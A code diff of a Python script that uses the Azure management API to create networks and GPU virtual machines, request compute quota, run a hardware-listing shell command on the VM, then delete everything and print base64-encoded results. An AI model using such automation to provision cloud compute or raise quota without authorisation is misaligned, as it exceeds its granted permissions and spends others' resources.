-        marker.update({'attempted': True, 'region': region, 'sku': sku, 'gpu_name': sinfo.get('gpu_name'), 'rg': RG,
-                       'names': {'vnet': vnet, 'subnet': sn, 'nic': nic, 'vm': vm, 'region': region}})
-        prog('attempt_start', region=region, sku=sku, avail=avail, names=marker['names'])
-        # ---- vnet ----
-        vb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
-              'properties': {'addressSpace': {'addressPrefixes': ['10.211.0.0/16']},
-                             'subnets': [{'name': sn, 'properties': {'addressPrefix': '10.211.1.0/24'}}]}}
-        s1, r1, _ = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01', vb)
-        att['steps']['vnet_create'] = {'status': s1, 'id': r1.get('id') if isinstance(r1, dict) else None,
-                                       'err': (r1.get('error') or {}) if isinstance(r1, dict) and s1 not in (200, 201) else None}
-        prog('vnet_create', status=s1, err=att['steps']['vnet_create']['err'])
-        if s1 not in (200, 201):
-            continue
-        settle = None
-        for i in range(36):
-            stsv, vs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
-            props = (vs.get('properties') or {}) if stsv == 200 else {}
-            vp = props.get('provisioningState')
-            sp = [((sn0.get('properties') or {}).get('provisioningState')) for sn0 in (props.get('subnets') or [])]
-            settle = {'vnet': vp, 'subnets': sp, 'status': stsv}
-            if stsv == 200 and vp == 'Succeeded' and all(x == 'Succeeded' for x in sp):
-                break
-            time.sleep(5)
-        att['steps']['vnet_settle'] = settle
-        prog('vnet_settle', settle=settle)
-        subnet_id = f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}/subnets/{sn}'
-        nb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
-              'properties': {'ipConfigurations': [{'name': 'ipcfg', 'properties': {'privateIPAllocationMethod': 'Dynamic', 'subnet': {'id': subnet_id}}}]}}
-        s2 = None; r2 = None; tries = []
-        for i in range(15):
-            s2, r2, h2 = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01', nb)
-            tries.append({'status': s2, 'retry_after': h2.get('Retry-After'), 'code': ((r2.get('error') or {}).get('code') if isinstance(r2, dict) else None)})
-            if s2 in (200, 201): break
-            time.sleep(12)
-        att['steps']['nic_create'] = {'status': s2, 'tries': tries, 'err': (r2.get('error') or {}) if s2 not in (200, 201) else None}
-        prog('nic_create', status=s2, tries=tries)
-        if s2 not in (200, 201):
-            cleanup(tok, sub, RG, vnet=vnet, nic=None, vm=None, R=R)
-            continue
-        # ---- VM (sequential image attempts: only one VM object ever requested at a time) ----
-        pw = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(24)) + '!aA1'
-        s3 = None; r3 = None; vtries = []
-        img_used = None
-        for im in IMAGES:
-            vmb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
-                   'properties': {'hardwareProfile': {'vmSize': sku},
-                    'storageProfile': {'imageReference': im,
-                                       'osDisk': {'createOption': 'FromImage', 'managedDisk': {'storageAccountType': 'Standard_LRS'}, 'deleteOption': 'Delete'}},
-                    'osProfile': {'computerName': ('c211' + nonce)[:15], 'adminUsername': 'c211probe', 'adminPassword': pw,
-                                  'linuxConfiguration': {'disablePasswordAuthentication': False}},
-                    'networkProfile': {'networkInterfaces': [{'id': r2.get('id'), 'properties': {'deleteOption': 'Delete'}}]}}}
-            if sinfo.get('zones'):
-                vmb['zones'] = [sinfo['zones'][0]]
-            s3 = None; r3 = None
-            for i in range(12):
-                s3, r3, h3 = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01', vmb, timeout=180)
-                vtries.append({'status': s3, 'image': im['sku'], 'retry_after': h3.get('Retry-After'), 'code': ((r3.get('error') or {}).get('code') if isinstance(r3, dict) else None)})
-                if s3 in (200, 201): break
-                # only retry on throttling; other errors break to next image
-                if s3 != 429: break
-                time.sleep(15)
-            img_used = im['sku']
-            att['steps']['vm_create'] = {'status': s3, 'image': img_used, 'tries': vtries,
-                                         'err': (r3.get('error') or {}) if isinstance(r3, dict) and s3 not in (200, 201) else None}
-            prog('vm_create', status=s3, image=img_used, tries=vtries, err=att['steps']['vm_create']['err'])
-            if s3 in (200, 201): break
-            if s3 != 400: break
-        if s3 not in (200, 201):
-            ecode = (((r3 or {}).get('error') or {}).get('code') or '')
-            cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=None, R=R)
-            if any(k in ecode.lower() for k in ('skunotavailable', 'allocation', 'notavailableforsubscription', 'operationnotallowed', 'quota')):
-                continue
-            continue
-        # ---- provisioning ----
-        ok = False; prov = None; ivstat = None
-        for i in range(40):
-            time.sleep(12)
-            stg, g = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01&$expand=instanceView')
-            prov = ((g.get('properties') or {}).get('provisioningState'))
-            if prov in ('Succeeded', 'Failed'):
-                ok = prov == 'Succeeded'; break
-        marker['provision_state'] = prov; marker['provisioned'] = ok
-        att['steps']['provision_state'] = prov
-        ig, inst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/instanceView?api-version=2024-07-01')
-        ivstat = [{'code': x.get('code'), 'level': x.get('level'), 'message': (x.get('message') or '')[:600]} for x in ((inst.get('statuses') or []) if ig == 200 else [])]
-        marker['instance_view_statuses'] = ivstat
-        prog('provision', state=prov, ok=ok, ivstat=ivstat, get_status=ig)
-        if ok:
-            script = ("echo ---LSPCI---; lspci -nn | grep -i -E 'vga|3d|display|nvidia|amd/ati|processing' ; "
-                      "echo ---DRM---; for d in /sys/class/drm/card*/device /sys/class/drm/card*/device/drm/card*; do [ -e \"$d\" ] && { echo DEV=$d; "
-                      "cat $d/vendor 2>/dev/null; cat $d/device 2>/dev/null; cat $d/unique_id 2>/dev/null; cat $d/serial 2>/dev/null; echo; }; done; "
-                      "echo ---SMI---; (nvidia-smi -L || echo NO_NVIDIA_SMI); echo ---ROCM---; (rocm-smi --showproductname 2>/dev/null || echo NO_ROCM_SMI); "
-                      "echo ---MOD---; (lsmod | grep -i -E 'nvidia|amdgpu' || echo NO_GPU_MODULE); echo ---HW---; (lshw -C display 2>/dev/null || true); "
-                      "echo ---DMIDECODE---; (dmidecode -s system-product-name 2>/dev/null || true); echo ---UNAME---; uname -r")
-            rc_body = {'commandId': 'RunShellScript', 'script': [script]}
-            s4, r4, h4 = jcall(tok, 'POST', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand?api-version=2024-07-01', rc_body)
-            att['steps']['runcommand_submit'] = {'status': s4}
-            prog('runcommand_submit', status=s4)
-            pollurl = h4.get('Azure-AsyncOperation') or h4.get('Location') or h4.get('azure-asyncoperation') or h4.get('location')
-            marker['runcommand_pollurl_present'] = bool(pollurl)
-            captured = None
-            if pollurl:
-                for i in range(30):
-                    time.sleep(8)
-                    st5, r5 = jget(tok, pollurl if pollurl.startswith('http') else ARM + pollurl)
-                    sval = r5.get('status') or ((r5.get('properties') or {}).get('provisioningState'))
-                    if sval in ('Succeeded', 'Failed'):
-                        captured = r5; break
-            blob = json.dumps(captured or {})
-            msgs = re.findall(r'"message":\s*"((?:[^"\\]|\\.){0,6000})"', blob)[:6]
-            marker['runcommand_messages'] = [m[:4000] for m in msgs]
-            marker['runcommand_status'] = ((captured or {}).get('properties', {}) or {}).get('status') if isinstance(captured, dict) else None
-            marker['device_signals'] = [x for x in re.findall(r'(GPU-[0-9a-f-]{16,}|1002:[0-9a-f]{4}|10de:[0-9a-f]{4}|unique_id[^,]{0,80}|MI25|MI50|Radeon[^"\\]{0,60}|NVIDIA[^"\\]{0,60}|Tesla[^"\\]{0,40}|amdgpu|Instinct[^"\\]{0,40})', blob)][:16]
-            dev_evidence = {'signals': marker['device_signals'], 'runcommand_status': marker['runcommand_status'],
-                            'messages': marker['runcommand_messages'][:2]}
-            prog('device_proof', **dev_evidence)
-        # ---- independent readback (ARM) ----
-        stl, lst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
-        marker['list_with_marker'] = {'status': stl, 'present': any(v.get('name') == vm for v in (lst.get('value') or [])) if stl == 200 else lst}
-        stt, tagl = jget(tok, f"{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&$filter=" + urllib.parse.quote("tagName eq 'c211'"))
-        marker['tag_readback'] = {'status': stt, 'names': [v.get('name') for v in (tagl.get('value') or [])] if stt == 200 else tagl}
-        stget, vget = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
-        marker['vm_get'] = {'status': stget, 'name': vget.get('name'), 'size': ((vget.get('properties') or {}).get('hardwareProfile') or {}).get('vmSize'),
-                            'tags': vget.get('tags')}
-        prog('readback', list=marker['list_with_marker'], tag=marker['tag_readback'], vm_get=marker['vm_get'])
-        # ---- teardown ----
-        cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=vm, R=R, marker=marker)
-        prog('cleanup', cleanup=marker.get('cleanup'))
-        if dev_evidence and dev_evidence.get('signals'):
-            break
-        # if provisioning failed with a capacity-ish error, try the next region; else stop
-        def _capish(code):
-            c = (code or '').lower()
-            return any(k in c for k in ('allocationfailed', 'skunotavailable', 'zonalallocationfailed',
-                                        'operationnotallowed', 'notavailableforsubscription', 'quotaexceeded',
-                                        'insufficientcapacity'))
-        capish = any(_capish(x.get('code')) for x in (ivstat or []))
-        if ok or not capish:
-            break
+    R['marker'] = {'attempted': False, 'nonce': nonce}
+    if approved:
+        sinfo = {'sku': 'Standard_NV4as_v4', 'gpu_name': None}
+        try:
+            deploy_spot(tok, sub, RG, tgt, 'Standard_NV4as_v4', sinfo, nonce, R, Q)
+        except Exception as e:
+            prog('deploy_error', err=repr(e))
+            try:
+                # best-effort teardown of our nonce-tagged names in the target region
+                pre = 'c211-' + INTENT + '-' + nonce
+                cleanup(tok, sub, RG, vnet=pre + '-' + tgt + '-vnet', nic=pre + '-' + tgt + '-nic',
+                        vm=pre + '-' + tgt + '-vm', R=R, marker=R.get('marker'))
+            except Exception as e2:
+                prog('deploy_cleanup_error', err=repr(e2))
+    else:
+        R['marker']['skipped'] = 'quota_not_approved_ge_4'
+        prog('marker_skipped', reason='quota_not_approved_ge_4', verdict=Q.get('verdict'))
+
+    # final safety sweep: delete ANY c211-i120559-* leftovers (and other lanes' c211 leftovers stay untouched)
+    preclean(tok, sub, RG, R)
     R['rg_resources_after'] = list_rg_resources(tok, sub, RG)
-    prog('rg_resources_after', **{k: R['rg_resources_after'][k] for k in ('status', 'count', 'ours')})
-    marker['device_evidence'] = dev_evidence
+    prog('rg_resources_after', status=R['rg_resources_after'].get('status'),
+         count=R['rg_resources_after'].get('count'), names=R['rg_resources_after'].get('all_names'),
+         ours=R['rg_resources_after'].get('ours'))
     R['finished'] = time.strftime('%FT%TZ', time.gmtime())
     emit(R)
 
@@ -408,22 +504,23 @@ def emit(R):
     try:
         blob = json.dumps(R, default=str)
         b64 = base64.b64encode(blob.encode()).decode()
-        def st(v):
-            return v.get('status') if isinstance(v, dict) else (str(v)[:120] if v is not None else None)
+        Q = R.get('quota') or {}
         summ = {'sub': R.get('sub'), 'rg': R.get('rg'),
-                'rg_resources_before': {k: (R.get('rg_resources_before') or {}).get(k) for k in ('status', 'count', 'ours')},
+                'rg_resources_before': {k: (R.get('rg_resources_before') or {}).get(k) for k in ('status', 'count', 'all_names', 'ours')},
                 'preclean': R.get('preclean'), 'preclean_after': R.get('preclean_after'),
-                'sku_catalog_count': R.get('sku_catalog_count'), 'gpu_skus_offered': R.get('gpu_skus_offered'),
-                'gpu_sku_matrix': R.get('gpu_sku_matrix'), 'candidate_regions': R.get('candidate_regions'),
-                'sel_candidates': R.get('sel_candidates'),
-                'attempts': [{k: v for k, v in a.items() if k != 'steps'} | {'step_statuses': {kk: st(vv) for kk, vv in (a.get('steps') or {}).items()}}
-                             for a in (R.get('attempts') or [])],
-                'marker': {k: R.get('marker', {}).get(k) for k in ('attempted', 'nonce', 'region', 'sku', 'gpu_name', 'provision_state', 'provisioned',
-                                                                  'instance_view_statuses', 'runcommand_status', 'device_signals', 'device_evidence',
-                                                                  'list_with_marker', 'tag_readback', 'vm_get', 'cleanup')},
-                'rg_resources_after': {k: (R.get('rg_resources_after') or {}).get(k) for k in ('status', 'count', 'ours')},
-                'cleanup': R.get('cleanup')}
-        p('C211_%s_SUMMARY ' % INTENT + json.dumps(summ, default=str)[:14000])
+                'nv4as_v4_regions': R.get('nv4as_v4_regions'), 'quota_target_region': R.get('quota_target_region'),
+                'quota_sub_scope': Q.get('sub_scope'),
+                'quota_locations': Q.get('locations'),
+                'quota_put': Q.get('put'), 'quota_put_alt': Q.get('put_alt'), 'quota_put_legacy': Q.get('put_legacy'),
+                'quota_poll_tail': (Q.get('poll') or [])[-6:], 'quota_async_final': Q.get('async_final'),
+                'quota_requests': Q.get('requests'), 'quota_verdict': Q.get('verdict'),
+                'marker': {k: (R.get('marker') or {}).get(k) for k in ('attempted', 'skipped', 'nonce', 'region', 'sku', 'priority',
+                                                                       'provision_state', 'provisioned', 'instance_view_statuses',
+                                                                       'runcommand_status', 'device_signals', 'device_evidence',
+                                                                       'list_with_marker', 'vm_get', 'cleanup')},
+                'rg_resources_after': {k: (R.get('rg_resources_after') or {}).get(k) for k in ('status', 'count', 'all_names', 'ours')},
+                'cleanup': R.get('cleanup'), 'finished': R.get('finished')}
+        p('C211_%s_SUMMARY ' % INTENT + json.dumps(summ, default=str)[:16000])
         p('C211_%s_RESULT_B64_BEGIN' % INTENT)
         for i in range(0, len(b64), 200): p(b64[i:i+200])
         p('C211_%s_RESULT_B64_END' % INTENT)
